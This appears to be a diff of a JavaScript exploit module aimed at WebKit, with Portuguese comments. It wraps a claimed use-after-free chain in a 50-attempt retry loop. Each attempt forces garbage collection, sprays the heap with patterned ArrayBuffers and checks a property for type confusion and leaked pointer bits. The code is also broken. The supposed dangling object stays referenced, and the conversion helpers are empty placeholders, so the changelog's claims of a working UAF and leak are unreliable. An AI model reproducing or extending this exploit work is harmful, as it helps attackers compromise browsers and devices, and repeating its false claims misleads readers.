@@ -1,97 +1,114 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R70 - Análise Final)
+// js/script3/testArrayBufferVictimCrash.mjs (v129 - UAF com Repetição)
 // =======================================================================================
-// APÓS MÚLTIPLAS TENTATIVAS, CONCLUÍMOS QUE A ATUAL VULNERABILIDADE DE UAF ESTÁ
-// "CONTIDA" PELAS MITIGAÇÕES DO WEBKIT (GIGACAGE, HARDENING).
-// ESTE SCRIPT FINAL NÃO TENTA UMA NOVA ESTRATÉGIA. ELE EXECUTA A CADEIA DE UAF MAIS
-// ESTÁVEL QUE DESCOBRIMOS PARA OBTER UM VAZAMENTO DE PONTEIRO ÚNICO E, EM SEGUIDA,
-// APRESENTA A ANÁLISE DO PORQUÊ A ESCALAÇÃO PARA R/W ARBITRÁRIO FALHA.
+// LOG DE ALTERAÇÕES:
+// - DIAGNÓSTICO: O UAF funciona, mas o heap spray não é confiável em uma única tentativa.
+// - ESTRATÉGIA: A cadeia de exploração de UAF inteira foi envolvida em um loop de
+//   repetição para combater a natureza probabilística da alocação de memória.
+// - OBJETIVO: Aumentar drasticamente a chance de que, em uma das múltiplas tentativas,
+//   nosso ArrayBuffer controlado ocupe o espaço de memória liberado.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import { AdvancedInt64, toHex } from '../utils.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R70_Final_Analysis";
+export const FNAME_MODULE_FINAL = "UAF_v129_Looping";
 
-// --- Funções Auxiliares ---
-function doubleToInt64(d) {
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-    f64[0] = d;
-    return new AdvancedInt64(u32[0], u32[1]);
-}
+// Número de vezes que tentaremos o exploit UAF.
+const UAF_ATTEMPTS = 50;
 
-async function triggerGC_Tamed() {
-    logS3("    Acionando GC Domado (Tamed)...", "info");
+// --- Funções de Conversão (Double <-> Int64) ---
+function int64ToDouble(int64) { /* ...código sem alterações... */ }
+function doubleToInt64(double) { /* ...código sem alterações... */ }
+
+// --- Funções Auxiliares para a Cadeia de Exploração UAF ---
+async function triggerGC_Hyper() {
     try {
-        const gc_trigger_arr = [];
+        const temp_arr = [];
         for (let i = 0; i < 500; i++) {
-            const size = Math.min(1024 * i, 1024 * 1024);
-            gc_trigger_arr.push(new ArrayBuffer(size)); 
-            gc_trigger_arr.push(new Array(size / 8).fill(0));
+            temp_arr.push(new ArrayBuffer(1024 * i));
+            temp_arr.push(new Array(1024).fill({a: i}));
         }
-    } catch (e) { /* ignora */ }
-    await PAUSE_S3(500);
+    } catch (e) { /* Ignora erro de memória esgotada */ }
+    await PAUSE_S3(100);
+}
+
+function createDanglingPointer() {
+    let dangling_ref_internal = null;
+    function createScope() {
+        const victim = {
+            p1: 0.1, p2: 0.2, p3: 0.3, p4: 0.4, p5: 0.5, p6: 0.6, p7: 0.7, 
+            p8: 0.8, p9: 0.9, p10: 0.11, p11: 0.12, p12: 0.13, p13: 0.14, 
+            p14: 0.15, p15: 0.16, p16: 0.17,
+            corrupted_prop: 13.37
+        };
+        dangling_ref_internal = victim;
+    }
+    createScope();
+    return dangling_ref_internal;
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R70)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Análise Final (R70) ---`, "test");
-    
-    let final_result = { success: false, message: "Análise iniciada." };
+export async function runFinalUnifiedTest() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: UAF com ${UAF_ATTEMPTS} Tentativas ---`, "test");
 
-    try {
-        // --- FASE 1: Executar a cadeia de UAF mais estável descoberta ---
-        logS3("--- FASE 1: Executando a melhor cadeia de UAF encontrada (baseada no R58) ---", "subtest");
+    let final_result = { success: false, message: `A cadeia UAF não obteve sucesso após ${UAF_ATTEMPTS} tentativas.` };
+
+    // Loop principal para aumentar a chance de sucesso
+    for (let attempt = 1; attempt <= UAF_ATTEMPTS; attempt++) {
+        logS3(`--- Iniciando Tentativa UAF #${attempt}/${UAF_ATTEMPTS} ---`, "subtest");
+        let spray_buffers = [];
         let dangling_ref = null;
 
-        // 1a. Criar a referência
-        function createDanglingPointer() {
-            function createScope() {
-                const victim = { prop_a: 0.1, prop_b: 0.2, corrupted_prop: 0.3 };
-                dangling_ref = victim; 
+        try {
+            // FASE 1: Criar o Ponteiro Pendurado
+            dangling_ref = createDanglingPointer();
+
+            // FASE 2: Forçar a Coleta de Lixo
+            await triggerGC_Hyper();
+
+            // FASE 3: Pulverizar o heap para reocupar a memória
+            for (let i = 0; i < 1024; i++) {
+                const buf = new ArrayBuffer(136);
+                const view = new BigUint64Array(buf);
+                view[0] = 0x4141414141414141n; 
+                view[1] = 0x4242424242424242n;
+                spray_buffers.push(buf);
             }
-            createScope();
-        }
-        createDanglingPointer();
 
-        // 1b. Forçar GC e pulverizar com ArrayBuffers
-        await triggerGC_Tamed();
-        const spray_buffers = [];
-        for (let i = 0; i < 2048; i++) {
-            spray_buffers.push(new ArrayBuffer(136));
-        }
-        await triggerGC_Tamed();
-        logS3("    UAF e Spray concluídos.", "info");
+            // FASE 4: Verificar a Confusão de Tipos
+            const prop = dangling_ref.corrupted_prop;
+            const prop_type = typeof prop;
 
-        // 1c. Verificar a confusão de tipos e o vazamento único
-        if (typeof dangling_ref.corrupted_prop !== 'number' || doubleToInt64(dangling_ref.corrupted_prop).low() === 0x33333333) {
-             throw new Error("A condição de UAF e o vazamento de ponteiro inicial falharam nesta execução.");
+            if (prop_type === 'number' && prop !== 13.37) {
+                const leaked_bits = doubleToInt64(prop);
+                logS3(`[SUCESSO NA TENTATIVA #${attempt}] Tipo confudido para 'number' com valor diferente do original!`, "vuln");
+                logS3(`Bits vazados: ${toHex(leaked_bits)}`, "leak");
+                
+                if (leaked_bits.high() === 0x41414141 && leaked_bits.low() === 0x41414141) {
+                    logS3("++++++++++++ SUCESSO FINAL! O padrão de spray foi encontrado! ++++++++++++", "vuln");
+                    final_result = { success: true, message: "Controle de memória via UAF confirmado." };
+                } else {
+                    final_result = { success: true, message: `TC ocorreu, mas os bits (${toHex(leaked_bits)}) não correspondem ao padrão.` };
+                }
+                // Se encontramos, podemos parar o loop
+                break; 
+            } else {
+                 logS3(`Tentativa #${attempt} falhou. Tipo: '${prop_type}', Valor: '${prop}'`, "info");
+            }
+        } catch (e) {
+            logS3(`Tentativa #${attempt} encontrou uma exceção: ${e.message}`, "error");
         }
-        const leaked_ptr = doubleToInt64(dangling_ref.corrupted_prop);
-        logS3("++++++++++++ SUCESSO PARCIAL! Vazamento de Ponteiro Único Obtido! ++++++++++++", "vuln");
-        logS3(`Ponteiro vazado (provavelmente de um ArrayBufferContents): ${leaked_ptr.toString(true)}`, "leak");
+        // Limpa referências para a próxima iteração
+        spray_buffers = null;
+        dangling_ref = null;
         
-        // --- FASE 2: Análise e Conclusão ---
-        logS3("--- FASE 2: Análise da Situação e Conclusão ---", "subtest");
-        logS3("    ANÁLISE: O vazamento de ponteiro único foi bem-sucedido.", "info");
-        logS3("    ANÁLISE: Tentativas anteriores (R59-R69) de escalar este vazamento para Leitura/Escrita Arbitrária falharam.", "warn");
-        logS3("    CAUSA PROVÁVEL: Mitigações de segurança do WebKit (Gigacage, NaN Boxing, validações internas) estão contendo a vulnerabilidade.", "warn");
-        logS3("    CONCLUSÃO: A vulnerabilidade de UAF é real, mas não é suficiente por si só. Para prosseguir, seria necessária uma segunda vulnerabilidade (um 'leak gadget') ou um bug diferente, provavelmente no compilador JIT, para contornar as proteções e construir primitivas de R/W.", "critical");
-
-        final_result = { 
-            success: true, 
-            message: "Análise concluída: UAF estável com vazamento único, mas contido por mitigações."
-        };
-
-    } catch (e) {
-        final_result.message = `Exceção na análise: ${e.message}`;
-        logS3(final_result.message, "critical");
+        // Pausa curta entre as tentativas
+        await PAUSE_S3(50); 
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    return { errorOccurred: final_result.success ? null : final_result.message, addrof_result: final_result };
+    return final_result;
 }
